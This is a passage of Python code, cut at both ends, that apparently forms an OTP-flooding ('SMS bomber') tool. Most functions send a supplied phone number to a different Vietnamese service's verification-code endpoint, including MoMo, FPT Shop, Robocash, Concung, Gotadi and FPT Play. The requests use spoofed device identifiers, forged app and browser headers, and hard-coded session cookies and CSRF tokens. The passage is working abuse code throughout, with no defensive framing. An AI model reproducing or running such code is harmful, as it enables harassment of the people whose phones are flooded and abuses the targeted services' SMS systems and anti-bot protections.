        "msgType": "SEND_OTP_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": "0"+phone[1:11],
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "action": "SEND",
            "rkey": rkey,
            "AAID": aaid,
            "IDFA": "",
            "TOKEN": token,
            "SIMULATOR": "",
            "SECUREID": secureid,
            "MODELID": "oppo cph1605mt6755b6z9qwrwhuy9yhrk",
            "isVoice": True,
            "REQUIRE_HASH_STRING_OTP": True,
            "checkSum": ""
        }
    }
    data1 = {
        "user":"0"+phone[1:11],
        "msgType": "CHECK_USER_BE_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": "0"+phone[1:11],
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "checkSum": ""
        }
    }
    h = {
        "agent_id" : "undefined",
        "sessionkey" : "",
        "user_phone" : "undefined",
        "authorization" : "Bearer undefined",
        "msgtype" : "SEND_OTP_MSG",
        "Host" : "api.momo.vn",
        "User-Agent" : "okhttp/3.14.17",
        "app_version": "31062",
        "app_code" : "3.1.6",
        "device_os" : "ANDROID",
        "Content-Type" : "application/json"
    }
    data = json.dumps(data)
    data1 = json.dumps(data1)
    requests.post("https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG",headers=h,data=data1).text
    t = requests.post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,data=data)
    try:
        t = t.json()
    except:
        t = t.text
def generateRandomString(length, minh):
    return ''.join(random.choices(minh, k=length))
def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))
def getimei():
    return generateRandomString(8, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(12, '0123456789abcdef')
def get_TOKEN():
    return generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+':'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(20, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(12, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(53, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'_'+generateRandomString(11, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(4, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
  
def fpt(phone):
    requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
    
def call3(phone):
    requests.post("https://api.senmo.vn/api/user/send-one-time-password", headers={"Host": "api.senmo.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"104\", \" Not A;Brand\";v\u003d\"99\", \"Google Chrome\";v\u003d\"104\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://senmo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://senmo.vn/user/login","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"phone":"84"+phone[1:11]})).text

def call2(phone):
    requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":"0"+phone[1:11]}})).text
    
def call1(phone):
    requests.post("https://api.vayvnd.vn/v1/users/password-reset", headers={"Host": "api.vayvnd.vn","content-length": "22","accept": "application/json","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://vayvnd.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vayvnd.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"login":"0"+phone[1:11]})).text

def call4(phone):
    Headers = {"Host": "atmonline.com.vn","content-length": "46","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json","sec-ch-ua-mobile": "?1","authorization": "","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://atmonline.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://atmonline.com.vn/portal-new/login?mobilePhone\u003d0777531398\u0026requestedAmount\u003d4000000\u0026requestedTerm\u003d4\u0026locale\u003dvn\u0026designType\u003dNEW","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_181P8FC3KD\u003dGS1.1.1681739176.1.1.1681739193.43.0.0"}
    Datason = json.dumps({"mobilePhone": phone,"source":"ONLINE"})
    response = requests.post("https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode",  data=Datason, headers=Headers)
    
def call5(phone):
    Headers = {"Host": "api.thantaioi.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://thantaioi.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://thantaioi.vn/user/login","accept-encoding": "gzip, deflate, br","cookie": "_ga_LBS7YCVKY6\u003dGS1.1.1681807570.2.1.1681807596.34.0.0"}
    Datason = json.dumps({"phone": f"84{phone[1:11]}"})
    response = requests.post("https://api.thantaioi.vn/api/user/send-one-time-password", data=Datason, headers=Headers)

def call9(phone):
  cookies = {
    'supportOnlineTalkID':
    'Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6',
    '__cfruid':
    'f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280',
    'XSRF-TOKEN':
    'eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D',
    'sessionid':
    'eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D',
    'utm_uid':
    'eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D',
    'ec_cache_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_cache_client':
    'false',
    'ec_cache_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_png_client':
    'false',
    'ec_png_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client':
    'false',
    'ec_png_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_etag_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'uid':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'client':
    'false',
    'client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
  }

  headers = {
    'authority': 'robocash.vn',
    'accept': '*/*',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'supportOnlineTalkID=Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6; __cfruid=f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280; XSRF-TOKEN=eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D; ec_cache_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_cache_client=false; ec_cache_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_png_client=false; ec_png_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_etag_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; uid=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; client=false; client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'origin': 'https://robocash.vn',
    'referer': 'https://robocash.vn/register',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'phone': phone,
    '_token': 'iSkFRbkX3IamHEhtVZAi9AZ3PLRlaXMjX1hJJS3I',
  }

  requests.post('https://robocash.vn/register/phone-resend',
                cookies=cookies,
                headers=headers,
                data=data)
     
def concung(phone):
    Headers = {"Host": "concung.com","content-length": "121","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://concung.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://concung.com/dang-nhap.html","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_BBD6001M29\u003dGS1.1.1679234342.1.1.1679234352.50.0.0"}
    Payload = {"ajax": "1","classAjax": "AjaxLogin","methodAjax": "sendOtpLogin","customer_phone": phone,"id_customer": "0","momoapp": "0","back": "khach-hang.html"}
    response = requests.post("https://concung.com/ajax.html", data=Payload, headers=Headers)

def cafeland(phone):
    Headers = {"Host": "nhadat.cafeland.vn","content-length": "65","accept": "application/json, text/javascript, */*; q\u003d0.01","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://nhadat.cafeland.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://nhadat.cafeland.vn/dang-ky.html","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "laravel_session\u003deyJpdiI6IkhyUE8yblwvVFA1Um9KZnQ3K0syalZ3PT0iLCJ2YWx1ZSI6IlZkaG1mb3JpTUtsdjVOT3dSa0RNUFhWeDBsT21QWlcra2J5bFNzT1Q5RHdQYm83UVR4em1hNUNUN0ZFYTlIeUwiLCJtYWMiOiJiYzg4ZmU2ZWY3ZTFiMmM4MzE3NWVhYjFiZGUxMDYzNjRjZWE2MjkwYjcwOTdkMDdhMGU0OWI0MzJkNmFiOTg2In0%3D"}
    Payload = {"mobile": phone,"_token": "bF6eZbKCCrOoXVKoixlRXzhTssc90B3KwRox2F4w",}
    response = requests.post("https://nhadat.cafeland.vn/member-send-otp/", data=Payload, headers=Headers)

def moneydong(phone):
    Headers = {"Host": "api.moneydong.vip","content-length": "72","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://h5.moneydong.vip","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://h5.moneydong.vip/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Payload = {"phone": phone[1:11], "type": "2", "ctype": "1", "chntoken": "69ad075c94c279e43608c5d50b77e8b9"}
    response = requests.post("https://api.moneydong.vip/h5/LoginMessage_ultimate", data=Payload, headers=Headers)
     
def call10(phone):
  headers = {
    'authority':
    'api.dongplus.vn',
    'accept':
    '*/*',
    'accept-language':
    'vi',
    'content-type':
    'application/json',
    'origin':
    'https://dongplus.vn',
    'referer':
    'https://dongplus.vn/user/login',
    'sec-ch-ua':
    '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile':
    '?1',
    'sec-ch-ua-platform':
    '"Android"',
    'sec-fetch-dest':
    'empty',
    'sec-fetch-mode':
    'cors',
    'sec-fetch-site':
    'same-site',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
    'phone': phone,
  }
  requests.post('https://api.dongplus.vn/api/user/send-one-time-password',
                headers=headers,
                json=json_data)                                                                

def gotadi(phone):
    Headers = {"Host": "api.gotadi.com","content-length": "44","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json","sec-ch-ua-platform": "\"Android\"","gtd-client-tracking-device-id": "85519cab-85d7-4881-abfa-65d2a2bb3a52","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","content-type": "application/json","origin": "https://www.gotadi.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.gotadi.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phoneNumber": phone,"language":"VI"})
    response = requests.post("https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp", data=Datason, headers=Headers)
###
def funring(phone):
    Headers = {"Host": "funring.vn","Connection": "keep-alive","Content-Length": "28","Accept": "*/*","User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","Content-Type": "application/json","Origin": "http://funring.vn","Referer": "http://funring.vn/module/register_mobile.jsp","Accept-Encoding": "gzip, deflate","Accept-Language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","Cookie": "JSESSIONID\u003dNODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; _ga\u003dGA1.2.1626827841.1679236846; _gid\u003dGA1.2.888694467.1679236846; _gat\u003d1"}
    Datason = json.dumps({"username": phone[1:11]})
    response = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp", data=Datason, headers=Headers)

def call11(phone):
  cookies = {
    'OnCredit_id': '643d8607c6ffe8.92935100',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef':
    'o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=',
    'SN5c8116d5e6183': 'rfsd6jmf1e0daeapvmv1p0i6bu',
  }

  headers = {
    'authority': 'oncredit.vn',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'OnCredit_id=643d8607c6ffe8.92935100; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=; SN5c8116d5e6183=rfsd6jmf1e0daeapvmv1p0i6bu',
    'origin': 'https://oncredit.vn',
    'referer': 'https://oncredit.vn/registration',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'data[typeData]':
    'sendCodeReg',
    'data[phone]':
    phone,
    'data[email]':
    'tv5v4v4v4c@gmail.com',
    'data[captcha1]':
    '1',
    'data[lang]':
    'vi',
    'CSRFName':
    'CSRFGuard_ajax',
    'CSRFToken':
    't8ETz5Y5HFnBefT9dEnDBDe9S4D5RdyEFNKSFDn8b5YSFAB7yr5rD5QZ6b974ARi',
  }

  requests.post('https://oncredit.vn/?ajax',
                cookies=cookies,
                headers=headers,
                data=data)

def fptplay(phone):
    Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers)   
                                                                      
def vietid(phone):
    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": 